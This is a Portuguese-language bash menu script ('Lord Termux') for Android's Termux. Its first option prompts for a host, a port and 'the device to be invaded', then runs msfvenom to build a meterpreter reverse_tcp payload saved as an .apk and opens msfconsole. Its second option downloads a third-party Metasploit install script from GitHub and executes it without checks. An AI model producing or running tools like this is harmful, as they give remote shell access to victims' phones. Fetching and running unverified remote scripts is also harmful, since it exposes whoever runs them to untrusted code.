#! /bin/bash
#
#Limpando a tela
clear
#
#Escrevendo Lord Termux
figlet Lord Termux
sleep 4
#
#Limpar a tela
clear
#
#Escrever MSVENOM
figlet MSFVENOM
#
#
#MENU
echo
echo '======================================='
echo '= \033[1;36m[\033[1;36m1]>> \033[1;33mCriar payload'
echo '= \033[1;36m[\033[1;36m2]>> \033[1;33mInstalar Metasploit'
echo '= \033[1;36m[\033[1;36m3]>> \033[1;33mSair'
echo '======================================='
echo
#Escolher entre 1 2 ou 3
#obrigado por usar
read -p "[+]>>" opcao
echo
if [ "$opcao" = "1" ];then
clear
figlet Payload
echo
 echo "Criando Payload"; sleep 2
echo
echo "\033[1;32m\n\n[+]=>DIGITE O HOST SEU HOST"
read -p "[+]=>" host
echo
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR"
read -p "[+]=>" porta
echo
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DO PAYLOAD"
read -p "[+]=>" nome
echo
echo "\033[1;32m\n\n[+]=>INFORME O DISPOSITIVO A SER INVADIDO"
read -p "[+]=>" dispo
#
clear
figlet CREATE
#
#
#Criando payload
./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
./msfconsole
fi
if [ "$opcao" = "2" ];then
echo
 echo "\033[1;32m\n\n[+]=>INSTALANDO METASPLOIT"; sleep 2
echo
cd ..
termux-setup-storage
pkg install curl
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
mv -v /data/data/com.termux/files/home/Payload/metasploit.sh /data/data/com.termux/files/home
./metasploit.sh
fi
if [ "$opcao" = "3" ];then
 echo
clear
figlet EXIT
exit
fi
